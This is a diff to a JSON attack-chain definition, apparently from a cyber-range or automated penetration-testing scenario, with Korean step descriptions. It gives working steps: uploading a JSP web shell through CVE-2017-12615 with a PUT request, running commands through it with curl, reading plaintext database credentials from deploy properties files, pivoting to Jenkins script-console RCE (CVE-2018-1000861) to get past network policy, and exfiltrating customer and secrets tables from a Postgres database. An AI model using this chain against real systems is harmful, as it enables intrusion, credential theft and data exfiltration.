@@ -14,7 +14,7 @@
        "description": "PUT 으로 .jsp 웹셸 업로드. ★ URL 끝 '/' 필수 — JspServlet 이 .jsp 요청을 가로채는 걸 우회(CVE-2017-12615 핵심). 없으면 404. 저장된 파일명은 '/' 떼고 shell.jsp."},
       {"id": "STEP-corp-tomcat-exec", "seq": 2,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=id'",
-       "description": "웹셸 GET 실행 → DMZ 원격코드실행. ★ 주의: URL 끝 '/' 금지 — 저장된 파일명은 shell.jsp (슬래시 없음). GET URL 에 '/' 붙이면 디렉토리 요청으로 처리돼 미응답. step1 과 다름(비대칭)."}
+       "description": "웹셸 GET 실행 → DMZ 원격코드실행. ★ 주의: URL 끝 '/' 금지 — 저장된 파일명은 shell.jsp (슬래시 없음). GET URL 에 '/' 붙이면 디렉토리 요청으로 처리돼 미응답. step1 과 다름(비대칭). ★★ 응답의 'PWD=/'·'uid=0(root)'·'id' 결과는 flag 가 아니라 단순 실행 증적 — 이것만 보고 '크라운 반출 완료' 로 해석하지 말 것(발견 노드로 올리면 거짓양성). 실제 자격증명·크라운 자산은 (1) 이 웹셸로 `cmd=ls%20/opt/deploy/` → `cmd=cat%20/opt/deploy/*.properties` 로 평문 크라운 DB 자격증명 수집, (2) 이 웹셸을 중계로 내부망 Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔 RCE(CVE-2018-1000861)로 corp-db.properties 획득 — 두 경로 모두 이 웹셸을 발판으로 중계 실행 필수(ext 발판 직접 치면 NetworkPolicy 로 차단). 최종 반출: postgres.corp-crown → customers·ops_secrets SELECT."}
     ]
   },
   "preconditions": [
